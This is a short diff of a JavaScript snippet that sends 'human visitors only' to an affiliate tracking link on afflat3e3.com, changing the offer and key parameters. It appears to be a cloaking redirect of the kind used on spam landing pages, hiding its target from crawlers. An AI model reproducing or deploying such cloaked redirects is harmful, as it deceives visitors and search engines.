@@ -23,7 +23,7 @@
 
   // Redirect human visitors only
   window.location.replace(
-    "https://afflat3e3.com/trk/lnk/8E68DDCC-2013-4590-8D6E-10EB4772E286/?o=32858&c=918277&a=156445&k=44E2F7DBD8171BA468B3920BC6853A05&l=38753"
+    "https://afflat3e3.com/trk/lnk/8E68DDCC-2013-4590-8D6E-10EB4772E286/?o=26763&c=918277&a=156445&k=D4E4ABFD58B3FDF3185DFD5DBF87FF82&l=28516"
   );
 
 })();
